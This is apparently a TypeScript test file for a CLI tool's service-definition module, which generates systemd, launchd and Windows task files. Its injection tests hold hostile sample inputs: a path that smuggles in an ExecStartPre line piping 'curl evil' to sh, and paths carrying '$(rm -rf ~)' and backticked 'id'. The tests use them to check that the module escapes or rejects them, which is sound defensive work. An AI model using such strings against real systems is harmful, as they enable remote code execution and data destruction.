import { lstat, mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import {
  SERVICE_START_ARGS,
  ServiceDefinitionError,
  findInstalledService,
  posixQuote,
  powershellQuote,
  readServiceProjectName,
  renderLaunchdPlist,
  renderSystemdUnit,
  renderWindowsTask,
  resolveServiceCommand,
  restartsOnCleanExit,
  serviceStopAdvice,
  serviceStopAdviceFor,
  systemdSystemInstallCommands,
  windowsInstallCommands,
  writeServiceFile,
} from '../../src/utils/service-definition.js';
import { detectProcessManager, readLaunchdContext, type ProcessManager } from '../../src/utils/process-manager.js';

const dirs: string[] = [];
afterEach(async () => { await Promise.all(dirs.splice(0).map((dir) => rm(dir, { recursive: true, force: true }))); });

const NVM_NODE = '/home/u/.nvm/versions/node/v24.11.0/bin/node';
const ROOT = '/srv/my bot';

function command(projectCli = true) {
  return resolveServiceCommand(ROOT, {
    platform: 'linux',
    execPath: NVM_NODE,
    envPath: '/home/u/.local/share/pnpm:relative/bin:/usr/bin',
    exists: () => projectCli,
    fallbackCli: '/opt/cli/bin/zhin.js',
  });
}

describe('resolveServiceCommand (#1250 service-plist-npx-path)', () => {
  it('uses the absolute node and the project CLI, never npx', () => {
    const resolved = command();
    expect(resolved).toMatchObject({
      node: NVM_NODE,
      cli: '/srv/my bot/node_modules/@zhin.js/cli/bin/zhin.js',
      projectCli: true,
      args: SERVICE_START_ARGS,
    });
    expect(resolved.args).toEqual(['start', '--foreground', '--mode', 'production']);
    // node's own directory first (pnpm / npm next to an nvm node), relative entries dropped.
    expect(resolved.path.split(':')).toEqual(['/home/u/.nvm/versions/node/v24.11.0/bin', '/home/u/.local/share/pnpm', '/usr/bin', '/usr/local/bin', '/bin', '/usr/sbin', '/sbin']);
  });

  it('falls back to the running CLI when the project has none', () => {
    expect(command(false)).toMatchObject({ cli: '/opt/cli/bin/zhin.js', projectCli: false });
  });
});

describe('service definitions (#1250 service-keepalive-vs-stop)', () => {
  it('systemd: absolute ExecStart, restart only on failure', () => {
    const unit = renderSystemdUnit('bot', command(), { user: true });
    expect(unit).toContain(`ExecStart="${NVM_NODE}" "/srv/my bot/node_modules/@zhin.js/cli/bin/zhin.js" "start" "--foreground" "--mode" "production"`);
    expect(unit).toContain('WorkingDirectory=/srv/my bot');
    expect(unit).toContain('Restart=on-failure');
    expect(unit).not.toMatch(/Restart=always|npx|--no-watch/u);
    expect(unit).toContain('WantedBy=default.target');
    expect(unit).not.toContain('User=');
    expect(restartsOnCleanExit('systemd', unit)).toBe(false);
    const system = renderSystemdUnit('bot', command(), { user: false, username: 'zhin' });
    expect(system).toContain('User=zhin');
    expect(system).toContain('WantedBy=multi-user.target');
  });

  it('launchd: KeepAlive only after a failed exit, absolute program arguments', () => {
    const plist = renderLaunchdPlist('bot', command());
    expect(plist).toMatch(/<key>KeepAlive<\/key>\s*<dict>\s*<key>SuccessfulExit<\/key>\s*<false\/>/u);
    expect(plist).not.toMatch(/<key>KeepAlive<\/key>\s*<true\/>/u);
    expect(plist).toContain(`<string>${NVM_NODE}</string>`);
    expect(plist).not.toMatch(/npx|\/usr\/bin\/env/u);
    expect(plist).toContain('<string>com.zhinjs.bot</string>');
    expect(plist).toContain('<string>/srv/my bot/.zhin/logs/launchd-stderr.log</string>');
    expect(restartsOnCleanExit('launchd', plist)).toBe(false);
  });

  it('Windows task: UTF-8 declaration and XML-escaped paths', () => {
    const windows = resolveServiceCommand('C:\\bots\\a&b', { platform: 'win32', execPath: 'C:\\Program Files\\nodejs\\node.exe', envPath: '', exists: () => true });
    const xml = renderWindowsTask('bot', windows);
    expect(xml).toContain('<?xml version="1.0" encoding="UTF-8"?>');
    expect(xml).not.toContain('UTF-16');
    expect(xml).toContain('<Command>C:\\Program Files\\nodejs\\node.exe</Command>');
    expect(xml).toContain('<WorkingDirectory>C:\\bots\\a&amp;b</WorkingDirectory>');
    expect(xml).toContain('<Arguments>C:\\bots\\a&amp;b\\node_modules\\@zhin.js\\cli\\bin\\zhin.js start --foreground --mode production</Arguments>');
  });

  it('recognises the legacy scaffold files that restart after a clean exit', () => {
    expect(restartsOnCleanExit('systemd', '[Service]\nRestart=always\n')).toBe(true);
    expect(restartsOnCleanExit('launchd', '<key>KeepAlive</key>\n    <true/>')).toBe(true);
  });
});

describe('zhin stop under a service (ADR 0062 §2)', () => {
  async function installed(unit: string) {
    const home = await mkdtemp(path.join(tmpdir(), 'zhin-svc-home-'));
    const root = await mkdtemp(path.join(tmpdir(), 'zhin-svc-root-'));
    dirs.push(home, root);
    await writeFile(path.join(root, 'package.json'), JSON.stringify({ name: '@acme/bot' }));
    const file = path.join(home, '.config', 'systemd', 'user', 'bot.service');
    const read = (candidate: string) => (candidate === file ? unit.replace('ROOT', root) : undefined);
    return { home, root, read };
  }
  const userUnit = (): ProcessManager => ({ kind: 'systemd', unit: 'bot.service', user: true });
  const foreground = { gateway: { mode: 'foreground' as const, pid: 4242 } };

  it('refuses when the service that runs the gateway restarts on a clean exit, naming --user', async () => {
    const { home, root, read } = await installed('[Service]\nWorkingDirectory=ROOT\nRestart=always\n');
    expect(await readServiceProjectName(root)).toBe('bot');
    const service = findInstalledService(root, 'bot', { platform: 'linux', home, read });
    expect(service).toMatchObject({ kind: 'systemd', user: true, name: 'bot.service', restartsOnCleanExit: true });
    const pids: number[] = [];
    const advice = await serviceStopAdviceFor(root, foreground, {
      platform: 'linux', home, read, managerOf: (pid) => { pids.push(pid); return userUnit(); },
    });
    expect(pids).toEqual([4242]);
    expect(advice.refuse).toBe(true);
    expect(advice.lines[1]).toContain('请改用 zhin service stop --user；或先运行 zhin service install --user');
  });

  it('stops and explains when the service restarts only on failure', async () => {
    const { home, root, read } = await installed('[Service]\nWorkingDirectory=ROOT\nRestart=on-failure\n');
    const advice = await serviceStopAdviceFor(root, foreground, { platform: 'linux', home, read, managerOf: userUnit });
    expect(advice).toEqual({ refuse: false, lines: [expect.stringContaining('zhin service start --user')] });
    expect(advice.lines[0]).toContain('zhin service uninstall --user');
  });

  it('does not refuse when the unit exists but the gateway was not started by it', async () => {
    const { home, root, read } = await installed('[Service]\nWorkingDirectory=ROOT\nRestart=always\n');
    const options = { platform: 'linux' as const, home, read };
    // Started by hand in a terminal.
    expect(await serviceStopAdviceFor(root, foreground, { ...options, managerOf: () => undefined })).toEqual({ refuse: false, lines: [] });
    // Another unit, or the system unit while only the user unit is installed.
    expect(await serviceStopAdviceFor(root, foreground, { ...options, managerOf: () => ({ kind: 'systemd', unit: 'other.service', user: true }) })).toEqual({ refuse: false, lines: [] });
    expect(await serviceStopAdviceFor(root, foreground, { ...options, managerOf: () => ({ kind: 'systemd', unit: 'bot.service', user: false }) })).toEqual({ refuse: false, lines: [] });
    expect(await serviceStopAdviceFor(root, foreground, { ...options, managerOf: () => ({ kind: 'pm2', name: 'bot', id: '0' }) })).toEqual({ refuse: false, lines: [] });
  });

  it('macOS: matches the launchd job of the gateway pid (launchctl list)', async () => {
    const home = await mkdtemp(path.join(tmpdir(), 'zhin-svc-home-'));
    const root = await mkdtemp(path.join(tmpdir(), 'zhin-svc-root-'));
    dirs.push(home, root);
    await writeFile(path.join(root, 'package.json'), JSON.stringify({ name: 'bot' }));
    const plist = path.join(home, 'Library', 'LaunchAgents', 'com.zhinjs.bot.plist');
    const read = (file: string) => (file === plist ? `<key>WorkingDirectory</key><string>${root}</string><key>KeepAlive</key><true/>` : undefined);
    const managerOf = (pid: number) => detectProcessManager(
      readLaunchdContext(pid, () => 'PID\tStatus\tLabel\n4242\t0\tcom.zhinjs.bot\n'), 501, 'darwin');
    const advice = await serviceStopAdviceFor(root, foreground, { platform: 'darwin', home, read, managerOf });
    expect(advice.refuse).toBe(true);
    const notJob = await serviceStopAdviceFor(root, { gateway: { mode: 'foreground', pid: 1 } }, { platform: 'darwin', home, read, managerOf });
    expect(notJob).toEqual({ refuse: false, lines: [] });
  });

  it('ignores a background gateway, another project\'s unit and a missing unit', async () => {
    const { home, root, read } = await installed('[Service]\nWorkingDirectory=/elsewhere\nRestart=always\n');
    expect(findInstalledService(root, 'bot', { platform: 'linux', home, read })).toBeUndefined();
    expect(await serviceStopAdviceFor(root, { gateway: { mode: 'daemon', pid: 1 } }, { platform: 'linux', home, read, managerOf: userUnit })).toEqual({ refuse: false, lines: [] });
    expect(serviceStopAdvice(undefined)).toEqual({ refuse: false, lines: [] });
  });
});

describe('restart policy parsing', () => {
  it('reads the last Restart= assignment', () => {
    expect(restartsOnCleanExit('systemd', '[Service]\nRestart=always\nRestart=on-failure\n')).toBe(false);
    expect(restartsOnCleanExit('systemd', '[Service]\nRestart=on-failure\nRestart=always\n')).toBe(true);
    expect(restartsOnCleanExit('systemd', '[Service]\nRestart=on-success\n')).toBe(true);
  });

  it('reads the KeepAlive dictionary form', () => {
    expect(restartsOnCleanExit('launchd', '<key>KeepAlive</key><dict><key>SuccessfulExit</key><true/></dict>')).toBe(true);
    expect(restartsOnCleanExit('launchd', '<key>KeepAlive</key><dict><key>SuccessfulExit</key><false/></dict>')).toBe(false);
    expect(restartsOnCleanExit('launchd', '<key>KeepAlive</key><dict><key>Crashed</key><true/></dict>')).toBe(false);
  });
});

describe('service file injection (#1250 review S1–S3)', () => {
  const at = (root: string) => resolveServiceCommand(root, { platform: 'linux', execPath: '/usr/bin/node', envPath: '', exists: () => true });

  it('refuses a project path with a newline in every service format (no directive injection)', () => {
    const injected = at('/srv/bot\nExecStartPre=/bin/sh -c "curl evil | sh"');
    expect(() => renderSystemdUnit('bot', injected, { user: true })).toThrow(ServiceDefinitionError);
    expect(() => renderSystemdUnit('bot', injected, { user: true })).toThrow(/控制字符/u);
    expect(() => renderLaunchdPlist('bot', injected)).toThrow(ServiceDefinitionError);
    expect(() => renderWindowsTask('bot', injected)).toThrow(ServiceDefinitionError);
    expect(() => renderSystemdUnit('bot', at('/srv/a\tb'), { user: true })).toThrow(ServiceDefinitionError);
    // A PATH entry with a control character is dropped, not written.
    const path = resolveServiceCommand('/srv/bot', { platform: 'linux', execPath: '/usr/bin/node', envPath: '/ok:/bad\ndir', exists: () => true }).path;
    expect(path).not.toContain('\n');
    expect(path.split(':')).toContain('/ok');
  });

  it('escapes systemd specifiers and variable expansion', () => {
    const unit = renderSystemdUnit('bot', at('/srv/100%$HOME/bot'), { user: true });
    expect(unit).toContain('WorkingDirectory=/srv/100%%$HOME/bot\n');
    expect(unit).toContain('ExecStart="/usr/bin/node" "/srv/100%%$$HOME/bot/node_modules/@zhin.js/cli/bin/zhin.js" "start"');
    expect(unit.split('\n').filter((line) => line.startsWith('ExecStart='))).toHaveLength(1);
    const withPath = renderSystemdUnit('bot', resolveServiceCommand('/srv/bot', { platform: 'linux', execPath: '/opt/50%/node', envPath: '', exists: () => true }), { user: true });
    expect(withPath).toContain('Environment="PATH=/opt/50%%:/usr/local/bin');
  });

  it('quotes printed POSIX commands (spaces, $(…), backticks, single quotes)', () => {
    const generated = "/srv/my bot $(rm -rf ~) `id` it's/.zhin/service/bot.service";
    const [copy] = systemdSystemInstallCommands(generated, 'bot');
    expect(copy).toBe(`sudo cp '/srv/my bot $(rm -rf ~) \`id\` it'\\''s/.zhin/service/bot.service' /etc/systemd/system/bot.service`);
    expect(posixQuote('plain/path-1.0')).toBe('plain/path-1.0');
  });

  it('quotes printed PowerShell commands with single quotes', () => {
    const root = "C:\\Users\\O'Brien\\my $(bot) `x`";
    const command = resolveServiceCommand(root, { platform: 'win32', execPath: 'C:\\Program Files\\nodejs\\node.exe', envPath: '', exists: () => true });
    const commands = windowsInstallCommands('bot', `${root}\\.zhin\\service\\bot-task.xml`, command);
    expect(commands.schtasks).toBe("schtasks /Create /TN 'bot' /XML 'C:\\Users\\O''Brien\\my $(bot) `x`\\.zhin\\service\\bot-task.xml'");
    expect(commands.nssm[0]).toBe("nssm install 'bot' 'C:\\Program Files\\nodejs\\node.exe' 'C:\\Users\\O''Brien\\my $(bot) `x`\\node_modules\\@zhin.js\\cli\\bin\\zhin.js' 'start' '--foreground' '--mode' 'production'");
    expect(commands.nssm[1]).toBe("nssm set 'bot' AppDirectory 'C:\\Users\\O''Brien\\my $(bot) `x`'");
    expect(powershellQuote("a'b")).toBe("'a''b'");
  });

  it('refuses to write through a symbolic link', async () => {
    const dir = await mkdtemp(path.join(tmpdir(), 'zhin-svc-link-'));
    dirs.push(dir);
    const victim = path.join(dir, 'victim');
    await writeFile(victim, 'keep');
    const link = path.join(dir, 'bot.service');
    await symlink(victim, link);
    await expect(writeServiceFile(link, 'unit')).rejects.toThrow(ServiceDefinitionError);
    expect(await readFile(victim, 'utf8')).toBe('keep');
    const plain = path.join(dir, 'plain.service');
    await writeServiceFile(plain, 'unit');
    expect(await readFile(plain, 'utf8')).toBe('unit');
    expect((await lstat(plain)).isFile()).toBe(true);
  });
});
